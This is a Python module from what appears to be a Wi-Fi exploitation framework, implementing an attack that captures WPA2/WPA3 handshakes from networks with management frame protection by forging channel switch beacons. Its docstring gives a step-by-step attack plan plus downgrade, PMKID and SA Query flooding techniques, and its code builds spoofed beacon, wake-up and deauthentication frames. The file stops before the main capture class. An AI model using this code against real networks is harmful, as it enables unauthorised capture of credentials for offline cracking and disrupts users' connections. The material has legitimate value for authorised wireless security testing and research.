#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""CSA Handshake Capture — PMF bypass via Channel Switch Announcement.

The definitive technique for capturing WPA2/WPA3 handshakes from modern APs
with PMF Required (802.11w) and modern clients (iPhone, Android 10+).

WHY CSA WORKS WHEN DEAUTH FAILS:
  - 802.11w (PMF) cryptographically protects Deauthentication and Disassociation
    frames — unprotected deauth is silently dropped by PMF-capable clients.
  - Channel Switch Announcement (IE 37) is carried INSIDE the beacon frame body
    and beacon frames are NEVER protected by PMF (they are broadcast management
    frames; encrypting them would break channel discovery for all devices).
  - Therefore, a spoofed beacon carrying a CSA element is indistinguishable from
    a legitimate one. The client obeys it, attempts the channel switch, fails (no
    AP on the fake channel), and re-associates — triggering a fresh 4-way handshake.

ATTACK STRATEGY (from wifikit v0.6.0 research + Politician library):
  1. PMF detection: read MFPC/MFPR bits from RSN IE of target beacon
  2. Identify connected clients from data frames (addr1=BSSID → addr2=client)
  3. QoS Null stimulation (FromDS=1, MoreData=1): wakes sleeping iOS/Android
     clients so they are listening when the CSA beacon arrives
  4. CSA Burst 1: inject spoofed beacons with CSA element pointing to a
     non-existent or unused channel (channel_switch_count=2 first, then 1)
     Intel firmware requires count≥2 first, then 1 — send both.
  5. Gap: 2s pause for STA queue processing (some chipsets need this)
  6. CSA Burst 2: second wave catches stragglers / clients that missed first
  7. Listen with M1-lock: monitor EAPOL; if M1 detected extend dwell 800ms
     to reliably catch M2 before moving on
  8. Half-handshake pivot: M2-only capture triggers immediate retry
  9. Deauth fallback: for non-PMF APs, add classic deauth after CSA burst
 10. Passive fallback: zero-TX mode just monitors for organic reconnections

ADDITIONAL TECHNIQUES:
  - WPA3 Transition Mode downgrade: if AP advertises SAE+WPA2, a WPA2-only
    rogue AP with the same SSID forces WPA2 4-way (crackable offline).
  - PMKID fishing via RSN IE in fake AssocReq (included here as secondary).
  - WNM Sleep Mode wakeup: IEEE 802.11v BSS Transition Request can displace
    clients to a preferred BSS — forcing reconnect.
  - SA Query timeout abuse: flood SA Query with fake PMF queries to exhaust
    the SA Query mechanism (edge case, target-specific).

OS requirement: Linux only
Version: 2.0.0
References:
  - https://github.com/RLabs-Inc/wifikit (CSA strategy)
  - https://github.com/0ldev/Politician (ESP32 implementation)
  - https://github.com/vanhoefm/libwifi-examples/blob/master/beacon_csa_attack.py
  - IEEE 802.11-2020 §9.4.2.18 (Channel Switch Announcement)
"""

import logging
import struct
import subprocess
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Scapy imports
# ---------------------------------------------------------------------------
try:
    from scapy.all import (
        EAPOL,
        Dot11,
        Dot11Action,
        Dot11AssoReq,
        Dot11Auth,
        Dot11Beacon,
        Dot11CSA,
        Dot11Deauth,
        Dot11Elt,
        Dot11EltCSA,
        Dot11QoS,
        Dot11SpectrumManagement,
        RadioTap,
        Raw,
        sendp,
        sniff,
        wrpcap,
    )
    _SCAPY_OK = True
except ImportError:
    _SCAPY_OK = False


# ---------------------------------------------------------------------------
# PMF detection from RSN IE
# ---------------------------------------------------------------------------

def _pmf_status(beacon_pkt) -> tuple[bool, bool]:
    """Return (pmf_capable, pmf_required) from RSN IE bits."""
    if not beacon_pkt:
        return False, False
    try:
        from scapy.all import Dot11Elt
        elt = beacon_pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 48:  # RSN IE
                d = bytes(elt.info)
                # RSN: ver(2)|group(4)|pairwise_cnt(2)|pairwise(N*4)|akm_cnt(2)|akm(N*4)|caps(2)
                off = 2  # skip version
                off += 4  # group cipher
                pc = struct.unpack_from("<H", d, off)[0] if len(d) > off + 1 else 0
                off += 2 + pc * 4
                ac = struct.unpack_from("<H", d, off)[0] if len(d) > off + 1 else 0
                off += 2 + ac * 4
                if len(d) >= off + 2:
                    caps = struct.unpack_from("<H", d, off)[0]
                    mfpr = bool(caps & 0x0040)  # bit 6 = MFPR
                    mfpc = bool(caps & 0x0080)  # bit 7 = MFPC
                    return mfpc, mfpr
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
    except Exception:
        pass
    return False, False


def _parse_beacon(pkt) -> dict | None:
    """Extract AP info from a beacon frame."""
    try:
        from scapy.all import Dot11, Dot11Beacon, Dot11Elt
        if not pkt.haslayer(Dot11Beacon):
            return None
        bssid = pkt[Dot11].addr3
        ssid, channel = "", 0
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 0:
                try:
                    ssid = elt.info.decode("utf-8", errors="replace")
                except Exception:
                    pass
            elif elt.ID == 3:
                try:
                    channel = int.from_bytes(elt.info, "big")
                except Exception:
                    pass
            elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
        rssi = getattr(pkt, "dBm_AntSignal", -100)
        mfpc, mfpr = _pmf_status(pkt)
        return dict(bssid=bssid, ssid=ssid, channel=channel,
                    rssi=rssi, mfpc=mfpc, mfpr=mfpr, beacon=pkt)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Frame builders
# ---------------------------------------------------------------------------

def _build_csa_beacon(
    original_beacon,
    fake_channel: int,
    count: int,
    target_mac: str = "ff:ff:ff:ff:ff:ff",
) -> object:
    """Clone AP beacon and inject CSA element (ID=37) pointing to fake_channel."""
    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11EltCSA, RadioTap
    bssid = original_beacon[Dot11].addr3
    ssid, rates, rsn, ht_cap, ext_rates = b"", b"", b"", b"", b""

    elt = original_beacon.getlayer(Dot11Elt)
    while elt:
        if elt.ID == 0:
            ssid = elt.info
        elif elt.ID == 1:
            rates = elt.info
        elif elt.ID == 50:
            ext_rates = elt.info
        elif elt.ID == 48:
            rsn = elt.info
        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

    cap = original_beacon[Dot11Beacon].cap if hasattr(original_beacon[Dot11Beacon], "cap") else 0x0431

    csa_beacon = (
        RadioTap()
        / Dot11(type=0, subtype=8,
                addr1=target_mac,
                addr2=bssid,
                addr3=bssid)
        / Dot11Beacon(cap=cap)
        / Dot11Elt(ID="SSID", info=ssid)
        / Dot11Elt(ID="Rates", info=rates or b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    )
    if rsn:
        csa_beacon /= Dot11Elt(ID=48, info=rsn)
    # Inject CSA element (mode=1 = stop Tx on this channel, new_channel=fake_channel)
    csa_beacon /= Dot11EltCSA(mode=1, new_channel=fake_channel, channel_switch_count=count)
    return csa_beacon


def _build_qos_null(bssid: str, client_mac: str) -> object:
    """QoS Null Data frame FromDS=1, MoreData=1 — wakes sleeping clients."""
    from scapy.all import Dot11, Dot11QoS, RadioTap
    # type=2 (data), subtype=12 (QoS Null)
    # FromDS=1 (2 in DS field), MoreData=1
    pkt = (
        RadioTap()
        / Dot11(
            type=2, subtype=12,
            FCfield=0x22,  # FromDS=1, MoreData=1
            addr1=client_mac,
            addr2=bssid,
            addr3=bssid,
            SC=0,
        )
        / Dot11QoS(TID=0, EOSP=0)
    )
    return pkt


def _build_deauth(bssid: str, client: str, reason: int = 7) -> object:
    from scapy.all import Dot11, Dot11Deauth, RadioTap
    return (
        RadioTap()
        / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=reason)
    )


# ---------------------------------------------------------------------------
# CSA Handshake Capturer
# ---------------------------------------------------------------------------

